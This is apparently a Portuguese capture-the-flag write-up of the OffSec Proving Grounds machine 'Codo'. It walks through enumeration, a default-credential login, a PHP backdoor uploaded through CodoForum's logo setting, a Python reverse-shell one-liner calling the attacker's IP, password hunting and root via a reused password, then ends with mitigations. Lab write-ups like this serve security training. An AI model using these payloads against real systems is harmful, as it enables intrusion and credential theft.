---
title:     "OffSec Proving Grounds - Codo"
tags: [linux,easy,codoforum v5.1.105]
categories: OffSecProvingGrounds
---

![image](https://github.com/user-attachments/assets/e753cdcc-36b2-4d0e-81de-01bb005fca9f)

## Enumeration

Como é prática comum, iniciamos a análise da máquina com uma etapa de enumeração para mapear suas portas e serviços expostos. Para isso, utilizamos o **Nmap** com as seguintes opções:

```
nmap -T4 -p- -v 192.168.243.23 -oN nmap-all-ports
```

- **-T4**: Define o nível de agressividade da varredura, permitindo uma execução mais rápida sem comprometer a precisão.
- **-p-**: Varre todas as portas, de 1 a 65535, garantindo que nenhum serviço exposto passe despercebido.
- **-v**: Habilita a saída verbosa, facilitando o monitoramento em tempo real do progresso da varredura.
- **-oN**: Salva o resultado da varredura em um arquivo de log para futura referência e análise.

Lembre-se de que você também pode utilizar a ferramenta **NmapAutomator** para agilizar o processo de varredura. O **NmapAutomator** automatiza diferentes tipos de varredura do **Nmap**, oferecendo uma maneira mais rápida e organizada de obter as informações necessárias.

```
nmapAutomator.sh -H 192.168.243.23 -t All -o nmapautomator.log
```

Essa ferramenta é especialmente útil para realizar múltiplos tipos de varredura em uma única execução, otimizando o tempo e garantindo que todas as portas e serviços relevantes sejam enumerados de maneira eficiente.

![image](https://github.com/user-attachments/assets/1dfbb709-7dbd-4401-a6bd-6e92f17eef70)

Ao verificar a porta 80, identificamos que ela está executando um fórum.

![image](https://github.com/user-attachments/assets/4a7141a8-987e-4084-9213-1480b7d8ce73)

Como sabemos, sempre que encontramos páginas de login, é recomendável tentar credenciais padrão, como admin:admin ou admin:password , entre outras combinações comumente utilizadas. Além disso, muitas vezes as credenciais padrão são fornecidas diretamente pela documentação do fabricante do produto, que pode ser facilmente encontrada no Google. Isso pode oferecer um caminho rápido para o acesso inicial, especialmente se as configurações de segurança não tiverem sido ajustadas corretamente.

![image](https://github.com/user-attachments/assets/8f3226fa-7403-4c77-8479-a4d82a97d9cb)

Pesquisando por explorações disponíveis, e utilizando como de costume a ferramenta searchsploit, encontrei algumas vulnerabilidades interessantes que podem ser testadas.

![image](https://github.com/user-attachments/assets/b119e57e-dcbd-48e3-9f52-1a41ebaf6237)

## Exploitation

Essa exploração é muito simples: você pode, nas configurações globais, modificar a logo do sistema. Em vez de enviar uma imagem, você faz o upload de um arquivo .php malicioso. Esse arquivo permitirá a execução de comandos no servidor, o que posteriormente poderá ser utilizado para obter uma reverse shell e ter acesso remoto à máquina.

Primeiro, você precisa modificar as configurações para aceitar o upload de arquivos .php, conforme mostro na imagem abaixo. Isso permitirá que você faça o upload do arquivo malicioso e o execute no servidor.

![image](https://github.com/user-attachments/assets/177dbad7-897f-4e18-9671-5df2c37cf70e)

Depois disso, no próprio Kali Linux, você pode buscar por arquivos .php maliciosos que possam ser usados em suas explorações. No meu caso, utilizei uma simples backdoor que me permitia executar comandos remotamente na máquina alvo.

![image](https://github.com/user-attachments/assets/49bd7eaa-925a-4493-9371-7dace3572c7f)

Então, fazemos o upload do nosso arquivo simple-backdoor.php e acessamos o arquivo no local indicado pelo servidor. Lembre-se de que é crucial entender a exploração para obter sucesso, garantindo que o processo funcione conforme esperado.

![image](https://github.com/user-attachments/assets/16c5c622-5468-4f64-bf37-5e7a91ef74e4)

![image](https://github.com/user-attachments/assets/98c7c9ac-0dd5-4766-b6aa-8fd11f583fca)

Ótimo! Conforme podemos observar na imagem acima, ao digitar o comando `id`, vemos que conseguimos executá-lo com sucesso na máquina alvo, confirmando que a exploração foi bem-sucedida.

Para obter uma reverse shell foi simples, mas antes, é importante verificar quais ferramentas estão disponíveis na máquina alvo. No meu caso, os payloads padrão de bash não estavam funcionando. Como já passei por isso antes, sabia que poderia utilizar outras opções, como Python. Verifiquei se o Python3 estava instalado usando o comando `which python3`, e confirmei que estava presente na máquina.

Usando os payloads disponíveis no site [Pentestmonkey - Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), encontrei o seguinte payload que utilizei para obter a **reverse shell**:

```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.232",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

![image](https://github.com/user-attachments/assets/deb7e27b-a0a0-4204-8651-63ff91a52ff5)

## Privilege Escalation

Sabemos que, ao obter uma **reverse shell**, é uma prática comum pesquisar por senhas em arquivos de configuração no próprio diretório do usuário ou do sistema. Utilizando comandos como **grep** para procurar por termos como "password" ou **find**, podemos frequentemente encontrar senhas interessantes que podem ser usadas para tentar acessar outros usuários ou serviços.

Aqui estão alguns comandos úteis para essa pesquisa:

1. **Buscar por "password" em arquivos de configuração:**
   ```
   grep -Ri "password" /path/to/directory
   ```

2. **Usar o comando find para localizar arquivos que contenham "password":**
   ```
   find /path/to/directory -type f -exec grep -i "password" {} \; -print
   ```

Esses comandos podem revelar credenciais armazenadas em arquivos de configuração, que podem ser valiosas para escalonamento de privilégios ou acesso a outros sistemas.

Como de costume, gosto de otimizar o tempo, então utilizei o **LinPEAS** ([disponível aqui](https://github.com/peass-ng/PEASS-ng)) para automatizar a coleta de informações sobre possíveis vetores de escalonamento de privilégios. Você também pode usar o **LinEnum.sh** ([disponível aqui](https://github.com/rebootuser/LinEnum)), que é outra ferramenta excelente para facilitar o processo de enumeração. Essas ferramentas agilizam muito nossas vidas ao identificarem rapidamente falhas de configuração e potenciais pontos de exploração.

![image](https://github.com/user-attachments/assets/5c84e6b1-619e-4b3e-ac3d-8f104676cdc3)

Ao analisar o arquivo /etc/passwd, identifiquei que havia dois usuários: offsec e root. Como já tínhamos uma senha disponível, decidi testar a troca de usuário para verificar se a senha funcionaria. Inicialmente, tentei logar como offsec, mas não tive sucesso. Em seguida, tentei logar como root e, bingo, a senha funcionou! Consegui obter acesso como root utilizando a senha encontrada anteriormente.

![image](https://github.com/user-attachments/assets/951cd05b-9969-46b9-ba29-4e69c7a8c587)

## Mitigation

Aqui estão algumas práticas recomendadas de mitigação para proteger sistemas contra as vulnerabilidades exploradas no processo descrito:

### 1. **Fortalecimento de Credenciais**
   - **Desativar Credenciais Padrão**: Uma das explorações iniciais usou credenciais padrão (ex.: **admin:admin**). Para mitigar esse risco, **desative ou altere credenciais padrão** imediatamente após a instalação de qualquer serviço. Além disso, implemente uma política de senha forte, que exija complexidade mínima e troca periódica de senhas.
   - **Autenticação Multifator (MFA)**: Implementar autenticação multifator para páginas de login críticas. Mesmo que as credenciais sejam comprometidas, o MFA fornece uma camada extra de segurança.

### 2. **Regras de Upload de Arquivos**
   - **Restrição no Upload de Arquivos**: A exploração foi possível porque foi permitido o upload de arquivos **.php** maliciosos. Para mitigar, restrinja o upload de arquivos a tipos seguros (como **.jpg**, **.png**, **.pdf**) e implemente verificações adicionais, como **filtros de tipo MIME** e verificação de extensões duplas.
   - **Verificação de Segurança no Upload**: Adote ferramentas que realizem a análise de arquivos enviados em busca de comportamento suspeito, como **ClamAV** ou outras soluções de detecção de malware.

### 3. **Restrições de Execução de Códigos Arbitrários**
   - **Desabilitar a Execução de Código em Diretórios de Upload**: Certifique-se de que diretórios usados para upload de arquivos, como o **/uploads/**, estejam configurados para **não permitir a execução de scripts**. Isso pode ser configurado no **Apache** ou **NGINX**, usando diretivas como `Options -ExecCGI` e `deny all`.
   - **Isolamento de Aplicações Web**: Considere o uso de contêineres ou ambientes virtuais para isolar aplicações web. Isso reduz o impacto de uma eventual exploração.

### 4. **Exploração de Reverse Shell e Escalonamento de Privilégios**
   - **Monitoramento e Logs**: Configure sistemas de monitoramento e detecção de intrusões (como o **Wazuh** ou **Fail2Ban**) para monitorar a atividade do sistema em tempo real e alertar sobre atividades anômalas, como a execução de comandos **bash** ou **python** inesperados.
   - **Política de Execução de Scripts**: Limite o acesso a linguagens de script, como **Python**, apenas para os administradores do sistema. Além disso, monitore quais binários estão sendo usados para gerar **reverse shells**.
   - **Desabilitar Ferramentas Não Necessárias**: Desinstale ou desabilite ferramentas que não são necessárias no servidor, como o **python3**, para reduzir a superfície de ataque.

### 5. **Gerenciamento de Privilégios**
   - **Princípio do Menor Privilégio**: A exploração foi possível pela descoberta de uma senha comum entre usuários. Garanta que cada usuário do sistema tenha apenas os privilégios necessários para suas funções. Contas com privilégios elevados, como **root**, devem ser controladas e monitoradas rigorosamente.
   - **Auditoria de Usuários e Permissões**: Realize auditorias periódicas das permissões de arquivos e usuários no sistema, principalmente em arquivos sensíveis como **/etc/passwd** e **/etc/shadow**, para identificar permissões excessivas ou mal configuradas.

### 6. **Automação de Verificação de Vulnerabilidades**
   - **Ferramentas de Escalonamento de Privilégios**: Ferramentas como **LinPEAS** e **LinEnum** ajudam a identificar vulnerabilidades no sistema. Para mitigar possíveis explorações, use essas ferramentas ou alternativas como **Lynis** ou **OpenSCAP** para realizar auditorias automáticas de segurança e corrigir pontos fracos identificados.

### 7. **Backup Regular e Plano de Resposta a Incidentes**
   - **Backups Regulares**: Configure um sistema de backups regulares dos dados críticos do sistema. Em caso de comprometimento, ter backups seguros é essencial para recuperação.
   - **Plano de Resposta a Incidentes**: Estabeleça um plano de resposta a incidentes para reagir rapidamente a uma possível invasão. Isso inclui isolamento de máquinas comprometidas, análise forense e mitigação de futuras ameaças.

### Conclusão
Implementar essas medidas preventivas e corretivas ajudará a reduzir significativamente as vulnerabilidades e os riscos de ataques semelhantes aos que foram descritos no writeup da máquina **CODO**.
